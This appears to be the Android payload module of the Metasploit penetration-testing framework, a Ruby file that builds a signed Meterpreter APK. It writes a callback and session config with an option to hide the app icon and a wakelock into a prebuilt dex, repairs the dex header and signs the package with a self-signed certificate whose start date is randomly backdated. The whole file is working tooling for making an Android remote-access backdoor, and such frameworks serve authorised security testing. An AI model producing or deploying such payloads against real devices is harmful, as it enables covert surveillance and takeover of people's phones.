# -*- coding: binary -*-
require 'msf/core'
require 'msf/core/payload/uuid/options'
require 'msf/core/payload/transport_config'
require 'rex/payloads/meterpreter/config'

module Msf::Payload::Android

  include Msf::Payload::TransportConfig
  include Msf::Payload::UUID::Options

  #
  # Fix the dex header checksum and signature
  # http://source.android.com/tech/dalvik/dex-format.html
  #
  def fix_dex_header(dexfile)
    dexfile = dexfile.unpack('a8LH40a*')
    dexfile[2] = Digest::SHA1.hexdigest(dexfile[3])
    dexfile[1] = Zlib.adler32(dexfile[2..-1].pack('H40a*'))
    dexfile.pack('a8LH40a*')
  end

  #
  # We could compile the .class files with dx here
  #
  def generate_stage(opts={})
    ''
  end

  def generate_default_stage(opts={})
    ''
  end

  #
  # Used by stagers to construct the payload jar file as a String
  #
  def generate(opts={})
    generate_jar(opts).pack
  end

  def java_string(str)
    [str.length].pack("N") + str
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid
    ds = opts[:datastore] || datastore

    config_opts = {
      ascii_str:  true,
      arch:       opts[:uuid].arch,
      expiration: ds['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: opts[:transport_config] || [transport_config(opts)],
      stageless:  opts[:stageless] == true
    }

    config = Rex::Payloads::Meterpreter::Config.new(config_opts).to_b
    flags = 0
    flags |= 1 if opts[:stageless]
    flags |= 2 if ds['AndroidMeterpreterDebug']
    flags |= 4 if ds['AndroidWakelock']
    flags |= 8 if ds['AndroidHideAppIcon']
    config[0] = flags.chr
    config
  end

  def sign_jar(jar)
    x509_name = OpenSSL::X509::Name.parse(
      "C=US/O=Android/CN=Android Debug"
    )
    key  = OpenSSL::PKey::RSA.new(2048)
    cert = OpenSSL::X509::Certificate.new
    cert.version = 2
    cert.serial = 1
    cert.subject = x509_name
    cert.issuer = x509_name
    cert.public_key = key.public_key

    # Some time within the last 3 years
    cert.not_before = Time.now - rand(3600 * 24 * 365 * 3)

    # From http://developer.android.com/tools/publishing/app-signing.html
    # """
    # A validity period of more than 25 years is recommended.
    #
    # If you plan to publish your application(s) on Google Play, note
    # that a validity period ending after 22 October 2033 is a
    # requirement. You cannot upload an application if it is signed
    # with a key whose validity expires before that date.
    # """
    #
    # 32-bit Ruby (and 64-bit Ruby on Windows) cannot deal with
    # certificate not_after times later than Jan 1st 2038, since long is 32-bit.
    # Set not_after to a random time 2~ years before the first bad date.
    #
    # FIXME: this will break again randomly starting in late 2033, hopefully
    # all 32-bit systems will be dead by then...
    #
    # The timestamp 0x78045d81 equates to 2033-10-22 00:00:01 UTC
    cert.not_after = Time.at(0x78045d81 + rand(0x7fffffff - 0x78045d81))

    # If this line is left out, signature verification fails on OSX.
    cert.sign(key, OpenSSL::Digest::SHA1.new)

    jar.sign(key, cert, [cert])
  end

  def generate_jar(opts={})
    config = generate_config(opts)
    if opts[:stageless]
      classes = MetasploitPayloads.read('android', 'meterpreter.dex')
      # Add stageless classname at offset 8000
      config += "\x00" * (8000 - config.size)
      config += 'com.metasploit.meterpreter.AndroidMeterpreter'
    else
      classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
    end

    config += "\x00" * (8195 - config.size)
    classes.gsub!("\xde\xad\xba\xad" + "\x00" * 8191, config)

    jar = Rex::Zip::Jar.new
    files = [
      [ "AndroidManifest.xml" ],
      [ "resources.arsc" ]
    ]
    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
    jar.add_file("classes.dex", fix_dex_header(classes))
    jar.build_manifest

    sign_jar(jar)

    jar
  end


end

